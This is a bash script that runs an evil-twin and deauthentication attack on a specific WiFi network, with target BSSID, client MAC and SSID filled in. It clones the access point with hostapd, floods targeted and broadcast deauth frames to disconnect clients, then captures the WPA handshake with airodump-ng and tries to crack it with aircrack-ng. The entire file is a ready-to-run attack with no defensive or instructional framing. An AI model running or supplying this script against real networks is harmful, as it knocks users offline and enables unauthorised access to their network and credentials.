#!/bin/bash
# Optimized handshake capture via evil twin deauth
# Target: 9899a5b76 (2.4GHz band of 9899a5b77 router)
set -x

TARGET_BSSID="8C:DE:F9:B3:9E:1F"
TARGET_CH=8
TARGET_CLIENT="EC:4D:3E:5C:B1:12"
SSID="9899a5b76"
OUTPUT="/tmp/hs_9899"
DEAUTH_COUNT=150
DEAUTH_DELAY=5  # 5ms between frames for speed

echo "=== [$(date +%H:%M:%S)] Step 1: Clean up ==="
sudo killall hostapd 2>/dev/null
sudo killall airodump-ng 2>/dev/null
sudo killall tcpdump 2>/dev/null
sudo iw dev ap0 del 2>/dev/null

echo "=== [$(date +%H:%M:%S)] Step 2: Set up AP evil twin ==="
sudo ip link set wlan0 down 2>/dev/null
sudo iw dev wlan0 set type managed 2>/dev/null
sudo ip link set wlan0 up

sudo iw phy phy0 interface add ap0 type __ap
sudo ip link set ap0 address "$TARGET_BSSID"
sudo ip link set ap0 up

echo "ap0 MAC: $(cat /sys/class/net/ap0/address)"

cat > /tmp/hs_hostapd.conf <<EOF
interface=ap0
driver=nl80211
ssid=$SSID
hw_mode=g
channel=$TARGET_CH
wpa=2
wpa_passphrase=dummypass123
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
EOF

sudo hostapd -B /tmp/hs_hostapd.conf
sleep 0.5

echo "=== [$(date +%H:%M:%S)] Step 3: Deauth burst ==="
# Targeted deauth to known client
sudo python3 /tmp/deauth_nl80211.py ap0 "$TARGET_BSSID" "$TARGET_CH" "$TARGET_CLIENT" $DEAUTH_COUNT $DEAUTH_DELAY 2>&1
# Broadcast deauth to catch any other clients
sudo python3 /tmp/deauth_nl80211.py ap0 "$TARGET_BSSID" "$TARGET_CH" ff:ff:ff:ff:ff:ff 50 $DEAUTH_DELAY 2>&1

echo "=== [$(date +%H:%M:%S)] Step 4: FAST switch to monitor ==="
sudo killall hostapd 2>/dev/null
# Minimal sleep - just enough for hostapd to die
sleep 0.1
sudo iw dev ap0 del 2>/dev/null
sudo ip link set wlan0 down
sudo iw dev wlan0 set type monitor
sudo ip link set wlan0 up
sudo iw dev wlan0 set channel "$TARGET_CH"
echo "=== [$(date +%H:%M:%S)] Monitor ready ==="

# Remove old captures
rm -f ${OUTPUT}*.cap ${OUTPUT}*.csv ${OUTPUT}*.pcap 2>/dev/null

echo "=== [$(date +%H:%M:%S)] Step 5: Capture 60 seconds ==="
sudo timeout 60 airodump-ng wlan0 -c "$TARGET_CH" --bssid "$TARGET_BSSID" -w "$OUTPUT" --output-format pcap 2>&1

echo "=== [$(date +%H:%M:%S)] Step 6: Check handshake ==="
CAP_FILE=$(ls ${OUTPUT}*.cap 2>/dev/null | head -1)
if [ -n "$CAP_FILE" ]; then
    ls -la "$CAP_FILE"
    sudo aircrack-ng "$CAP_FILE" 2>&1 | head -30
else
    echo "No capture file found!"
fi
echo "=== Done ==="
